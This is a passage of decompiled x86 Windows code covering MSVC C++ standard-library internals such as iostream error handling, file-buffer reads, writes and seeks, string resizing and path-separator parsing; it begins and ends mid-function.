  int v20; // [esp+34h] [ebp-1Ch] BYREF
  int v21; // [esp+3Ch] [ebp-14h] BYREF
  int v22; // [esp+40h] [ebp-10h]
  int v23; // [esp+4Ch] [ebp-4h]

  *((_DWORD *)this + 12) = 0;
  *((_DWORD *)this + 2) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 5) = 513;
  *((_DWORD *)this + 6) = 6;
  *((_DWORD *)this + 7) = 0;
  *((_DWORD *)this + 8) = 0;
  *((_DWORD *)this + 9) = 0;
  *((_DWORD *)this + 10) = 0;
  *((_DWORD *)this + 11) = 0;
  *((_DWORD *)this + 3) = 0;
  v4 = operator new(8u);
  v5 = v4;
  if ( v4 )
  {
    *(_QWORD *)v4 = 0i64;
    v23 = 0;
    v4[1] = std::locale::_Init(1);
  }
  else
  {
    v5 = 0;
  }
  *((_DWORD *)this + 12) = v5;
  *((_DWORD *)this + 14) = a2;
  *((_DWORD *)this + 15) = 0;
  v6 = v5[1];
  v23 = 1;
  v22 = v6;
  (*(void (__thiscall **)(int))(*(_DWORD *)v6 + 4))(v6);
  v23 = 2;
  v7 = sub_406B80((int)&v21);
  v23 = 3;
  if ( v22 )
  {
    v8 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v22 + 8))(v22);
    if ( v8 )
      (**v8)(v8, 1);
  }
  v9 = *(_DWORD *)v7;
  v23 = -1;
  v10 = (*(int (__thiscall **)(char *, int))(v9 + 32))(v7, 32);
  v11 = *((_DWORD *)this + 14) == 0;
  *((_BYTE *)this + 64) = v10;
  if ( v11 )
  {
    v12 = *((_DWORD *)this + 4);
    v13 = *((_DWORD *)this + 3) & 0x13 | 4;
    *((_DWORD *)this + 3) = v13;
    v14 = v13 & v12;
    if ( v14 )
    {
      if ( (v14 & 4) != 0 )
      {
        v17 = sub_40B080(&v21, 1);
        sub_407160(v19, "ios_base::badbit set", v17);
      }
      else
      {
        if ( (v14 & 2) == 0 )
        {
          v15 = sub_40B080(&v20, 1);
          sub_407160(pExceptionObject, "ios_base::eofbit set", v15);
          _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
        }
        v16 = sub_40B080(&v21, 1);
        sub_407160(v19, "ios_base::failbit set", v16);
      }
      _CxxThrowException(v19, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
    }
  }
  if ( a3 )
    std::ios_base::_Addstd(this);
}

//----- (0040B040) --------------------------------------------------------
_DWORD *__cdecl sub_40B040(_DWORD *a1, int a2)
{
  _DWORD *result; // eax

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_509594,
          (int (__stdcall *)(void *, void *, void **))sub_405D70,
          &unk_509598) )
    terminate();
  result = a1;
  *a1 = a2;
  a1[1] = &unk_509598;
  return result;
}
// 41828B: using guessed type void __noreturn terminate(void);

//----- (0040B080) --------------------------------------------------------
_DWORD *__cdecl sub_40B080(_DWORD *a1, int a2)
{
  _DWORD *result; // eax

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_5095A0,
          (int (__stdcall *)(void *, void *, void **))sub_405D90,
          &unk_5095A4) )
    terminate();
  result = a1;
  *a1 = a2;
  a1[1] = &unk_5095A4;
  return result;
}
// 41828B: using guessed type void __noreturn terminate(void);

//----- (0040B0C0) --------------------------------------------------------
void **__stdcall sub_40B0C0(void **a1, int a2)
{
  char *v2; // edx

  v2 = (char *)std::_Syserror_map(a2);
  a1[4] = 0;
  a1[5] = (void *)15;
  *(_BYTE *)a1 = 0;
  sub_4093F0(a1, v2, strlen(v2));
  return a1;
}

//----- (0040B110) --------------------------------------------------------
void **__stdcall sub_40B110(void **a1, int a2)
{
  char *v3; // edx

  if ( a2 == 1 )
  {
    a1[4] = 0;
    a1[5] = (void *)15;
    *(_BYTE *)a1 = 0;
    sub_4093F0(a1, "iostream stream error", 0x15u);
  }
  else
  {
    v3 = (char *)std::_Syserror_map(a2);
    a1[4] = 0;
    a1[5] = (void *)15;
    *(_BYTE *)a1 = 0;
    sub_4093F0(a1, v3, strlen(v3));
  }
  return a1;
}

//----- (0040B190) --------------------------------------------------------
void **__stdcall sub_40B190(void **Src, DWORD dwMessageId)
{
  CHAR *v2; // eax
  unsigned int v3; // eax
  void *v4; // ecx
  _DWORD *v5; // ecx
  unsigned int v6; // eax
  unsigned int v7; // edi
  unsigned int v8; // edi
  size_t v9; // eax
  void *v10; // eax
  _DWORD *v11; // ebx
  void *v12; // eax

  Src[4] = 0;
  Src[5] = (void *)15;
  *(_BYTE *)Src = 0;
  sub_4092B0(Src, 0x7FFFu, 0);
  v2 = (CHAR *)Src;
  if ( (unsigned int)Src[5] >= 0x10 )
    v2 = (CHAR *)*Src;
  v3 = std::_Winerror_message(dwMessageId, v2, 0x7FFFu);
  if ( v3 )
  {
    v4 = Src[4];
    if ( v3 > (unsigned int)v4 )
    {
      sub_409100(Src, v3 - (_DWORD)v4, 0);
    }
    else
    {
      Src[4] = (void *)v3;
      v5 = Src;
      if ( (unsigned int)Src[5] >= 0x10 )
        v5 = *Src;
      *((_BYTE *)v5 + v3) = 0;
    }
  }
  else
  {
    sub_4093F0(Src, "unknown error", 0xDu);
  }
  v6 = (unsigned int)Src[5];
  if ( v6 >= 0x10 )
  {
    v7 = (unsigned int)Src[4];
    if ( v7 < 0x10 )
    {
      sub_4086F0(Src);
      return Src;
    }
    v8 = v7 | 0xF;
    if ( v8 > 0x7FFFFFFF )
      v8 = 0x7FFFFFFF;
    if ( v8 < v6 )
    {
      if ( v8 + 1 < 0x1000 )
      {
        v11 = operator new(v8 + 1);
      }
      else
      {
        v9 = v8 + 36;
        if ( v8 + 36 <= v8 + 1 )
          v9 = -1;
        v10 = operator new(v9);
        if ( !v10 )
          goto LABEL_27;
        v11 = (_DWORD *)(((unsigned int)v10 + 35) & 0xFFFFFFE0);
        *(v11 - 1) = v10;
      }
      memmove_0(v11, *Src, (size_t)Src[4] + 1);
      v12 = *Src;
      if ( (unsigned int)Src[5] + 1 < 0x1000 )
      {
LABEL_25:
        sub_40FBF3(v12);
        *Src = v11;
        Src[5] = (void *)v8;
        return Src;
      }
      if ( (unsigned int)v12 - *((_DWORD *)v12 - 1) - 4 <= 0x1F )
      {
        v12 = (void *)*((_DWORD *)v12 - 1);
        goto LABEL_25;
      }
LABEL_27:
      _invalid_parameter_noinfo_noreturn();
    }
  }
  return Src;
}
// 40B2B3: conditional instruction was optimized away because edi.4>=F

//----- (0040B320) --------------------------------------------------------
const char *sub_40B320()
{
  return "generic";
}

//----- (0040B330) --------------------------------------------------------
const char *sub_40B330()
{
  return "iostream";
}

//----- (0040B340) --------------------------------------------------------
const char *sub_40B340()
{
  return "system";
}

//----- (0040B350) --------------------------------------------------------
int __thiscall sub_40B350(_DWORD *this, char *a2, int a3, int a4)
{
  _DWORD *v5; // esi
  FILE *v6; // eax
  int v7; // ecx
  _DWORD *v8; // ebx
  void (__thiscall ***v9)(_DWORD, int); // eax
  int v10; // ecx
  int result; // eax
  int v12; // ecx
  int *v13; // [esp-4h] [ebp-3Ch]
  int *v14; // [esp-4h] [ebp-3Ch]
  int *v15; // [esp-4h] [ebp-3Ch]
  char pExceptionObject[20]; // [esp+10h] [ebp-28h] BYREF
  int v17; // [esp+24h] [ebp-14h] BYREF
  int v18; // [esp+28h] [ebp-10h]
  int v19; // [esp+34h] [ebp-4h]

  v5 = this + 1;
  if ( this[20] || (v6 = sub_40F223(a2, a3 | 2, a4)) == 0 )
  {
    v5 = 0;
  }
  else
  {
    sub_408C70((int)v5, v6, 1);
    v7 = *(_DWORD *)(v5[13] + 4);
    v19 = 0;
    v18 = v7;
    (*(void (__thiscall **)(int))(*(_DWORD *)v7 + 4))(v7);
    v19 = 1;
    v8 = sub_406A10((int)&v17);
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*v8 + 12))(v8) )
    {
      v5[14] = 0;
    }
    else
    {
      v5[14] = v8;
      sub_408D70(v5);
    }
    v19 = 2;
    if ( v18 )
    {
      v9 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v18 + 8))(v18);
      if ( v9 )
        (**v9)(v9, 1);
    }
    v19 = -1;
  }
  v10 = *(_DWORD *)(*this + 4);
  if ( v5 )
  {
    result = 4;
    if ( *(_DWORD *)((char *)this + v10 + 56) )
      result = 0;
    *(_DWORD *)((char *)this + v10 + 12) = result;
    if ( (result & *(_DWORD *)((char *)this + v10 + 16)) != 0 )
      goto LABEL_21;
  }
  else
  {
    result = (*(_DWORD *)((char *)this + v10 + 12) | (4 * (*(_DWORD *)((char *)this + v10 + 56) == 0) + 2)) & 0x17;
    *(_DWORD *)((char *)this + v10 + 12) = result;
    v12 = result & *(_DWORD *)((char *)this + v10 + 16);
    if ( v12 )
    {
      if ( (v12 & 4) == 0 )
      {
        if ( (v12 & 2) != 0 )
        {
          v13 = sub_40B080(&v17, 1);
          sub_407160(pExceptionObject, "ios_base::failbit set", v13);
        }
        else
        {
          v14 = sub_40B080(&v17, 1);
          sub_407160(pExceptionObject, "ios_base::eofbit set", v14);
        }
LABEL_22:
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
      }
LABEL_21:
      v15 = sub_40B080(&v17, 1);
      sub_407160(pExceptionObject, "ios_base::badbit set", v15);
      goto LABEL_22;
    }
  }
  return result;
}

//----- (0040B4E0) --------------------------------------------------------
int __thiscall sub_40B4E0(int this, int a2)
{
  char v3; // cl
  int result; // eax
  unsigned int v5; // edx
  _DWORD *v6; // esi
  _DWORD *v7; // ecx
  _BYTE *v8; // edx
  _DWORD *v9; // esi
  int v10; // ecx
  int v11; // edx
  int v12; // edx
  int v13; // eax
  int v14; // ecx
  void **v15; // eax
  unsigned int v16; // esi
  void **v17; // ecx
  void **v18; // edx
  int v19; // eax
  void **v20; // ecx
  size_t v21; // edi
  void **v22; // ecx
  size_t v23; // eax
  bool v24; // zf
  int v25; // ebx
  int v26; // eax
  int v27; // ecx
  void **v28; // ecx
  char *v29; // [esp+10h] [ebp-34h] BYREF
  void **v30; // [esp+14h] [ebp-30h] BYREF
  void *Buffer[4]; // [esp+18h] [ebp-2Ch] BYREF
  unsigned int v32; // [esp+28h] [ebp-1Ch]
  unsigned int v33; // [esp+2Ch] [ebp-18h]
  char v34; // [esp+33h] [ebp-11h] BYREF
  int v35[4]; // [esp+34h] [ebp-10h] BYREF

  v3 = a2;
  if ( a2 == -1 )
    return 0;
  v5 = **(_DWORD **)(this + 32);
  if ( v5 && (v6 = *(_DWORD **)(this + 48), v5 < *v6 + v5) )
  {
    --*v6;
    v7 = *(_DWORD **)(this + 32);
    v8 = (_BYTE *)(*v7)++;
    result = a2;
    *v8 = a2;
  }
  else if ( *(_DWORD *)(this + 76) )
  {
    v9 = *(_DWORD **)(this + 12);
    if ( *v9 == this + 60 )
    {
      v10 = *(_DWORD *)(this + 80);
      v11 = *(_DWORD *)(this + 84);
      *v9 = v10;
      v12 = v11 - v10;
      **(_DWORD **)(this + 28) = v10;
      v3 = a2;
      **(_DWORD **)(this + 44) = v12;
    }
    if ( *(_DWORD *)(this + 56) )
    {
      v34 = v3;
      v32 = 0;
      v33 = 15;
      LOBYTE(Buffer[0]) = 0;
      sub_4092B0(Buffer, 8u, 0);
      v35[3] = 0;
LABEL_15:
      v15 = (void **)Buffer[0];
      v16 = v33;
      while ( 1 )
      {
        v17 = Buffer;
        v18 = Buffer;
        if ( v16 >= 0x10 )
        {
          v17 = v15;
          v18 = v15;
        }
        v19 = (*(int (__thiscall **)(_DWORD, int, char *, int *, char **, void **, unsigned int, void ***))(**(_DWORD **)(this + 56) + 28))(
                *(_DWORD *)(this + 56),
                this + 64,
                &v34,
                v35,
                &v29,
                v18,
                (unsigned int)v17 + v32,
                &v30);
        if ( v19 < 0 )
          goto LABEL_35;
        if ( v19 > 1 )
          break;
        v16 = v33;
        v20 = Buffer;
        v15 = (void **)Buffer[0];
        if ( v33 >= 0x10 )
          v20 = (void **)Buffer[0];
        v21 = (char *)v30 - (char *)v20;
        if ( v30 != v20 )
        {
          v22 = Buffer;
          if ( v33 >= 0x10 )
            v22 = (void **)Buffer[0];
          v23 = fwrite(v22, 1u, v21, *(FILE **)(this + 76));
          v16 = v33;
          v24 = v21 == v23;
          v15 = (void **)Buffer[0];
          if ( !v24 )
            goto LABEL_36;
        }
        *(_BYTE *)(this + 61) = 1;
        if ( v29 != &v34 )
        {
          v25 = a2;
          goto LABEL_37;
        }
        if ( !v21 )
        {
          if ( v32 < 0x20 )
          {
            sub_409100(Buffer, 8u, 0);
            goto LABEL_15;
          }
          goto LABEL_36;
        }
      }
      if ( v19 != 3 )
      {
LABEL_35:
        v16 = v33;
        v15 = (void **)Buffer[0];
LABEL_36:
        v25 = -1;
        goto LABEL_37;
      }
      v26 = fputc(v34, *(FILE **)(this + 76));
      v16 = v33;
      v27 = -1;
      v24 = v26 == -1;
      v15 = (void **)Buffer[0];
      if ( !v24 )
        v27 = a2;
      v25 = v27;
LABEL_37:
      if ( v16 >= 0x10 )
      {
        v28 = v15;
        if ( v16 + 1 >= 0x1000 )
        {
          v15 = (void **)*(v15 - 1);
          if ( (unsigned int)((char *)v28 - (char *)v15 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        sub_40FBF3(v15);
      }
      return v25;
    }
    else
    {
      v13 = fputc(v3, *(FILE **)(this + 76));
      v14 = -1;
      if ( v13 != -1 )
        return a2;
      return v14;
    }
  }
  else
  {
    return -1;
  }
  return result;
}

//----- (0040B700) --------------------------------------------------------
int __stdcall sub_40B700(int a1)
{
  return -1;
}

//----- (0040B710) --------------------------------------------------------
int __fastcall sub_40B710(_DWORD *a1, int a2, int a3)
{
  unsigned int v4; // eax
  int v5; // esi
  int v6; // esi
  void *v7; // ecx
  _DWORD *v8; // esi
  unsigned int v9; // eax
  unsigned int v10; // ecx
  unsigned int v11; // edi
  _DWORD *v12; // edx
  _DWORD *v13; // eax
  unsigned int v14; // ecx
  unsigned int v15; // edi
  _DWORD *v16; // eax
  _DWORD *v17; // edx
  unsigned int v18; // edx
  _DWORD *v19; // eax
  _DWORD *v20; // eax
  _DWORD *v21; // eax
  _DWORD *v22; // eax
  void *v23; // ecx
  void *v24; // ecx
  unsigned int v26; // [esp+10h] [ebp-68h]
  int v27; // [esp+14h] [ebp-64h]
  int v28; // [esp+18h] [ebp-60h]
  void *v29[4]; // [esp+28h] [ebp-50h] BYREF
  __int128 v30; // [esp+38h] [ebp-40h]
  void *Block[4]; // [esp+48h] [ebp-30h] BYREF
  int v32; // [esp+58h] [ebp-20h]
  int v33; // [esp+5Ch] [ebp-1Ch]
  unsigned int v34; // [esp+60h] [ebp-18h]
  unsigned int v35; // [esp+64h] [ebp-14h]
  int v36; // [esp+74h] [ebp-4h]

  *(_DWORD *)(a3 + 16) = 0;
  *(_DWORD *)(a3 + 20) = 7;
  *(_WORD *)a3 = 0;
  v4 = a1[4];
  v36 = 0;
  if ( v4 )
  {
    Block[0] = a1;
    *(_OWORD *)v29 = 0i64;
    v33 = 0;
    v30 = 0i64;
    v34 = 7;
    LOWORD(Block[1]) = 0;
    v36 = 1;
    v35 = v4;
    sub_4088D0((int **)Block);
    v36 = 2;
    v5 = sub_407830((int)Block);
    v29[0] = *(void **)v5;
    sub_406E20(&v29[1], (_DWORD *)(v5 + 4));
    v6 = *(_DWORD *)(v5 + 28);
    v28 = v6;
    HIDWORD(v30) = v6;
    LOBYTE(v36) = 4;
    if ( v34 >= 8 )
    {
      v7 = Block[1];
      if ( 2 * v34 + 2 >= 0x1000 )
      {
        v7 = (void *)*((_DWORD *)Block[1] - 1);
        if ( (unsigned int)(Block[1] - v7 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_40FBF3(v7);
    }
    *(_OWORD *)Block = 0i64;
    Block[0] = a1;
    v32 = 0;
    v33 = 0;
    v34 = 7;
    LOWORD(Block[1]) = 0;
    LOBYTE(v36) = 5;
    v35 = 0;
    sub_4088D0((int **)Block);
    LOBYTE(v36) = 6;
    while ( Block[0] != v29[0] || v35 != v6 )
    {
      sub_406820((void **)a3, (char *)&Block[1]);
      v8 = Block[0];
      v9 = sub_408F40((int *)Block[0]);
      v10 = v35;
      v11 = v8[4];
      v26 = v11;
      if ( v35 >= v9 )
      {
        if ( v35 != v9 || v9 >= v11 )
          goto LABEL_29;
        v12 = v8;
        if ( v8[5] >= 8u )
          v12 = (_DWORD *)*v8;
        v27 = 2 * v9;
        if ( *((_WORD *)v12 + v9) == 47
          || (v8[5] < 8u ? (v13 = v8) : (v13 = (_DWORD *)*v8), *(_WORD *)((char *)v13 + v27) == 92) )
        {
          v14 = v35 + 1;
          v35 = v14;
          if ( v14 < v11 )
          {
            do
            {
              v15 = v8[5];
              v16 = v8;
              v17 = v8;
              if ( v15 >= 8 )
                v16 = (_DWORD *)*v8;
              if ( *((_WORD *)v16 + v14) != 47 )
              {
                if ( v15 >= 8 )
                  v17 = (_DWORD *)*v8;
                if ( *((_WORD *)v17 + v14) != 92 )
                  break;
              }
              v35 = ++v14;
            }
            while ( v14 < v26 );
          }
        }
        else
        {
LABEL_29:
          if ( v35 < v11 )
          {
            while ( 1 )
            {
              v18 = v8[5];
              v19 = v8;
              if ( v18 >= 8 )
                v19 = (_DWORD *)*v8;
              if ( *((_WORD *)v19 + v10) != 47 )
              {
                v20 = v8;
                if ( v18 >= 8 )
                  v20 = (_DWORD *)*v8;
                if ( *((_WORD *)v20 + v10) != 92 )
                  break;
              }
              v35 = ++v10;
              if ( v10 >= v11 )
                goto LABEL_28;
            }
            for ( ; v10 < v11; v35 = ++v10 )
            {
              v21 = v8;
              if ( v8[5] >= 8u )
                v21 = (_DWORD *)*v8;
              if ( *((_WORD *)v21 + v10) == 47 )
                break;
              v22 = v8;
              if ( v8[5] >= 8u )
                v22 = (_DWORD *)*v8;
              if ( *((_WORD *)v22 + v10) == 92 )
                break;
            }
          }
        }
LABEL_28:
        sub_4088D0((int **)Block);
        v6 = v28;
      }
      else
      {
        v35 = v9;
        sub_4088D0((int **)Block);
        v6 = v28;
      }
    }
    if ( v34 >= 8 )
    {
      v23 = Block[1];
      if ( 2 * v34 + 2 >= 0x1000 )
      {
        v23 = (void *)*((_DWORD *)Block[1] - 1);
        if ( (unsigned int)(Block[1] - v23 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_40FBF3(v23);
    }
    if ( DWORD2(v30) >= 8 )
    {
      v24 = v29[1];
      if ( (unsigned int)(2 * DWORD2(v30) + 2) >= 0x1000 )
      {
        v24 = (void *)*((_DWORD *)v29[1] - 1);
        if ( (unsigned int)(v29[1] - v24 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_40FBF3(v24);
    }
  }
  return a3;
}

//----- (0040BA30) --------------------------------------------------------
int __thiscall sub_40BA30(int this, int a2)
{
  int v2; // ebx
  unsigned int v4; // ecx
  _DWORD *v6; // ecx
  _BYTE *v7; // edx
  _DWORD *v8; // edi

  v2 = a2;
  v4 = **(_DWORD **)(this + 28);
  if ( v4 && **(_DWORD **)(this + 12) < v4 && (a2 == -1 || *(unsigned __int8 *)(v4 - 1) == a2) )
  {
    ++**(_DWORD **)(this + 44);
    --**(_DWORD **)(this + 28);
    if ( a2 == -1 )
      return 0;
    return v2;
  }
  if ( !*(_DWORD *)(this + 76) || a2 == -1 )
    return -1;
  if ( !*(_DWORD *)(this + 56) && ungetc((unsigned __int8)a2, *(FILE **)(this + 76)) != -1 )
    return v2;
  v6 = *(_DWORD **)(this + 28);
  v7 = (_BYTE *)(this + 60);
  if ( *v6 == this + 60 )
    return -1;
  v8 = *(_DWORD **)(this + 12);
  *v7 = a2;
  if ( (_BYTE *)*v8 != v7 )
  {
    *(_DWORD *)(this + 80) = *v8;
    *(_DWORD *)(this + 84) = *v6 + **(_DWORD **)(this + 44);
  }
  *v8 = v7;
  **(_DWORD **)(this + 28) = v7;
  **(_DWORD **)(this + 44) = 1;
  return a2;
}

//----- (0040BAE0) --------------------------------------------------------
const void **__thiscall sub_40BAE0(_DWORD *Src, unsigned int a2, unsigned int a3, char *Srca, unsigned int a5)
{
  unsigned int v5; // edx
  unsigned int v7; // edi
  _DWORD *v8; // edx
  unsigned int v10; // eax
  _DWORD *v11; // edx
  bool v12; // cf
  char *v13; // edi
  char *v14; // edx
  int v15; // edi
  unsigned int v16; // [esp+Ch] [ebp-18h]
  unsigned int v17; // [esp+10h] [ebp-14h]
  unsigned int v18; // [esp+18h] [ebp-Ch]
  char *v19; // [esp+18h] [ebp-Ch]
  unsigned int v20; // [esp+1Ch] [ebp-8h]
  char *v21; // [esp+20h] [ebp-4h]

  v5 = a3;
  v7 = Src[4];
  v17 = a5;
  if ( v7 < a2 )
    sub_409080();
  if ( v7 - a2 < a3 )
    v5 = v7 - a2;
  v18 = v5;
  if ( v5 == a5 )
  {
    v8 = Src;
    if ( Src[5] >= 8u )
      v8 = (_DWORD *)*Src;
    memmove((char *)v8 + 2 * a2, Srca, 2 * a5);
    return (const void **)Src;
  }
  else
  {
    v16 = v7 - v5 - a2;
    v20 = a5 - v5;
    if ( a5 >= v5 )
    {
      if ( v20 > Src[5] - v7 )
      {
        LOBYTE(v17) = 0;
        return sub_405F00((const void **)Src, v20, v17, a2, v5, Srca, a5);
      }
      else
      {
        v19 = (char *)Src;
        v12 = Src[5] < 8u;
        Src[4] = v7 + v20;
        if ( !v12 )
          v19 = (char *)*Src;
        v21 = &v19[2 * a2];
        v14 = &v21[2 * v5];
        if ( &Srca[2 * a5] <= v21 || Srca > &v19[2 * v7] )
        {
          v15 = a5;
        }
        else if ( v14 > Srca )
        {
          v15 = (v14 - Srca) >> 1;
        }
        else
        {
          v15 = 0;
        }
        memmove(&v14[2 * v20], v14, 2 * v16 + 2);
        memmove(v21, Srca, 2 * v15);
        memmove_0(&v21[2 * v15], &Srca[2 * v15 + 2 * v20], 2 * (a5 - v15));
        return (const void **)Src;
      }
    }
    else
    {
      v10 = v7 + a5 - v5;
      v11 = Src;
      v12 = Src[5] < 8u;
      Src[4] = v10;
      if ( !v12 )
        v11 = (_DWORD *)*Src;
      v13 = (char *)v11 + 2 * a2;
      memmove(v13, Srca, 2 * a5);
      memmove(&v13[2 * a5], &v13[2 * v18], 2 * v16 + 2);
      return (const void **)Src;
    }
  }
}
// 409080: using guessed type void __noreturn sub_409080(void);

//----- (0040BC80) --------------------------------------------------------
void __thiscall sub_40BC80(void **Src, unsigned int a2)
{
  unsigned int v3; // edi
  unsigned int v4; // edx
  unsigned int v5; // edi
  unsigned int v6; // ecx
  unsigned int v7; // ecx
  size_t v8; // eax
  void *v9; // eax
  _DWORD *v10; // ebx
  _DWORD *v11; // eax
  void *v12; // edi
  size_t v13; // [esp-4h] [ebp-18h]
  unsigned int v14; // [esp+Ch] [ebp-8h]
  unsigned int v15; // [esp+10h] [ebp-4h]

  v3 = (unsigned int)Src[4];
  v14 = v3;
  if ( v3 <= a2 )
  {
    v4 = (unsigned int)Src[5];
    v15 = v4;
    if ( v4 != a2 )
    {
      if ( v4 >= a2 )
      {
        if ( a2 < 0x10 && v4 >= 0x10 )
          sub_4086F0(Src);
      }
      else
      {
        if ( 0x7FFFFFFF - v3 < a2 - v3 )
          sub_409070();
        v5 = a2 | 0xF;
        if ( (a2 | 0xF) <= 0x7FFFFFFF )
        {
          v6 = v4 >> 1;
          if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
          {
            if ( v5 < v6 + v4 )
              v5 = v6 + v4;
          }
          else
          {
            v5 = 0x7FFFFFFF;
          }
        }
        else
        {
          v5 = 0x7FFFFFFF;
        }
        v7 = __CFADD__(v5, 1) ? -1 : v5 + 1;
        if ( v7 < 0x1000 )
        {
          if ( v7 )
          {
            v11 = operator new(__CFADD__(v5, 1) ? -1 : v5 + 1);
            v4 = v15;
            v10 = v11;
          }
          else
          {
            v10 = 0;
          }
        }
        else
        {
          v8 = v7 + 35;
          if ( v7 + 35 <= v7 )
            v8 = -1;
          v9 = operator new(v8);
          if ( !v9 )
            goto LABEL_30;
          v4 = v15;
          v10 = (_DWORD *)(((unsigned int)v9 + 35) & 0xFFFFFFE0);
          *(v10 - 1) = v9;
        }
        Src[4] = (void *)a2;
        Src[5] = (void *)v5;
        v13 = v14 + 1;
        if ( v4 >= 0x10 )
        {
          v12 = *Src;
          memmove_0(v10, *Src, v13);
          if ( v15 + 1 < 0x1000 )
          {
LABEL_23:
            sub_40FBF3(v12);
            *Src = v10;
            Src[4] = (void *)v14;
            return;
          }
          if ( (unsigned int)v12 - *((_DWORD *)v12 - 1) - 4 <= 0x1F )
          {
            v12 = (void *)*((_DWORD *)v12 - 1);
            goto LABEL_23;
          }
LABEL_30:
          _invalid_parameter_noinfo_noreturn();
        }
        memmove_0(v10, Src, v13);
        *Src = v10;
        Src[4] = (void *)v14;
      }
    }
  }
}
// 409070: using guessed type void __noreturn sub_409070(void);

//----- (0040BDF0) --------------------------------------------------------
int __thiscall sub_40BDF0(int this, int a2, __int64 a3, int Origin, int a5)
{
  unsigned int v6; // eax
  unsigned int v7; // ebx
  int v8; // edx
  int v9; // esi
  int v10; // ecx
  unsigned int v12; // [esp+Ch] [ebp-10h]
  fpos_t Position; // [esp+10h] [ebp-Ch] BYREF

  if ( **(_DWORD **)(this + 28) == this + 60 && Origin == 1 && !*(_DWORD *)(this + 56) )
  {
    v6 = (unsigned __int64)(a3 - 1) >> 32;
    v7 = a3 - 1;
  }
  else
  {
    v6 = HIDWORD(a3);
    v7 = a3;
  }
  v12 = v6;
  if ( !*(_DWORD *)(this + 76)
    || !sub_408760((void *)this)
    || (__PAIR64__(v7, v12) || Origin != 1) && _fseeki64(*(FILE **)(this + 76), __SPAIR64__(v12, v7), Origin)
    || fgetpos(*(FILE **)(this + 76), &Position) )
  {
    *(_DWORD *)a2 = -1;
    *(_DWORD *)(a2 + 4) = -1;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_QWORD *)(a2 + 16) = 0i64;
  }
  else
  {
    std::filebuf::_Reset_back(this);
    v8 = *(_DWORD *)(this + 64);
    v9 = *(_DWORD *)(this + 68);
    *(_DWORD *)(a2 + 8) = Position;
    v10 = HIDWORD(Position);
    *(_DWORD *)a2 = 0;
    *(_DWORD *)(a2 + 4) = 0;
    *(_DWORD *)(a2 + 12) = v10;
    *(_DWORD *)(a2 + 16) = v8;
    *(_DWORD *)(a2 + 20) = v9;
  }
  return a2;
}
// 409030: using guessed type int __thiscall std::filebuf::_Reset_back(_DWORD);

//----- (0040BEF0) --------------------------------------------------------
int __stdcall sub_40BEF0(int a1, int a2, int a3, int a4, int a5)
{
  int result; // eax

  *(_DWORD *)a1 = -1;
  result = a1;
  *(_DWORD *)(a1 + 4) = -1;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  *(_QWORD *)(a1 + 16) = 0i64;
  return result;
}

//----- (0040BF30) --------------------------------------------------------
int __thiscall sub_40BF30(int this, int a2, __int64 Offset, fpos_t a4, int a5, int a6, int a7)
{
  int v8; // edx
  int v9; // esi
  int v10; // ecx
  fpos_t Position; // [esp+10h] [ebp-Ch] BYREF

  Position = a4;
  if ( !*(_DWORD *)(this + 76)
    || !sub_408760((void *)this)
    || fsetpos(*(FILE **)(this + 76), &Position)
    || Offset && _fseeki64(*(FILE **)(this + 76), Offset, 1)
    || fgetpos(*(FILE **)(this + 76), &Position) )
  {
    *(_DWORD *)a2 = -1;
    *(_DWORD *)(a2 + 4) = -1;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_QWORD *)(a2 + 16) = 0i64;
  }
  else
  {
    *(_DWORD *)(this + 64) = a5;
    *(_DWORD *)(this + 68) = a6;
    std::filebuf::_Reset_back(this);
    v8 = *(_DWORD *)(this + 64);
    v9 = *(_DWORD *)(this + 68);
    *(_DWORD *)(a2 + 8) = Position;
    v10 = HIDWORD(Position);
    *(_DWORD *)a2 = 0;
    *(_DWORD *)(a2 + 4) = 0;
    *(_DWORD *)(a2 + 12) = v10;
    *(_DWORD *)(a2 + 16) = v8;
    *(_DWORD *)(a2 + 20) = v9;
  }
  return a2;
}
// 409030: using guessed type int __thiscall std::filebuf::_Reset_back(_DWORD);

//----- (0040C030) --------------------------------------------------------
int __stdcall sub_40C030(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  int result; // eax

  *(_DWORD *)a1 = -1;
  result = a1;
  *(_DWORD *)(a1 + 4) = -1;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  *(_QWORD *)(a1 + 16) = 0i64;
  return result;
}

//----- (0040C070) --------------------------------------------------------
FILE **__thiscall sub_40C070(FILE **this, char *Buffer, __int64 Size)
{
  FILE *v4; // ecx
  int v5; // eax

  v4 = this[19];
  if ( !v4 )
    return 0;
  v5 = Buffer || Size ? 0 : 4;
  if ( setvbuf(v4, Buffer, v5, Size) )
    return 0;
  sub_408C70((int)this, this[19], 1);
  return this;
}

//----- (0040C0C0) --------------------------------------------------------
void *__thiscall sub_40C0C0(void *this, int a2, int a3, int a4)
{
  return this;
}

//----- (0040C0D0) --------------------------------------------------------
__int64 sub_40C0D0()
{
  return 0i64;
}

//----- (0040C0E0) --------------------------------------------------------
int *__cdecl sub_40C0E0(int *a1, LPCWSTR lpFileName)
{
  int v3[2]; // [esp+0h] [ebp-8h] BYREF

  v3[1] = 0;
  v3[0] = 0;
  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_5095AC,
          (int (__stdcall *)(void *, void *, void **))sub_405DB0,
